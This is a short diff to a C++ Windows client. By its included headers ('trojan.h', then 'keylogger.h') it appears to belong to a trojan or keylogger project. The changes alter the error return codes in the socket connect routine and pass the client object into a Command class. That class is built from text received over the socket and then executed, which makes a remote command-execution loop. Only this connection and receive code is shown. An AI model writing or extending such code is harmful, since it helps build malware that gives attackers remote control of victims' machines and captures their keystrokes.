@@ -1,5 +1,5 @@
 #include "client.h"
-#include "trojan.h"
+#include "keylogger.h"
 #include "command.h"
 
 
@@ -27,7 +27,7 @@ int Client::c_connect()
 	{
 		std::cout << "ERROR! WSA startup failed";
 		Sleep(1000);
-		return 0;
+		return -1;
 	}
 
 
@@ -37,7 +37,7 @@ int Client::c_connect()
 	{
 		std::cout << "ERROR! Invalid socket";
 		Sleep(1000);
-		return 0;
+		return -1;
 	}
 
 	iResult = connect(sock, (SOCKADDR*)&addr, sizeof(sockaddr_in));
@@ -46,7 +46,7 @@ int Client::c_connect()
 	{
 		std::cout << "ERROR! Connect failed %u" << WSAGetLastError();
 		Sleep(5000);
-		return 0;
+		return -1;
 	}
 	if (DEBUG)
 		std::cout << "Connected!\n";
@@ -55,7 +55,7 @@ int Client::c_connect()
 	std::thread t_receiver(doRecv, this);
 	t_receiver.detach();
 
-	return 1;
+	return 0;
 }
 
 void Client::receiver()
@@ -65,7 +65,7 @@ void Client::receiver()
 	{
 		recv(sock, chunk, 200, 0);
 		std::string str(chunk);
-		Command cmd = Command(str);
+		Command cmd = Command(str, this);
 		cmd.execCommand();
 	}
 }
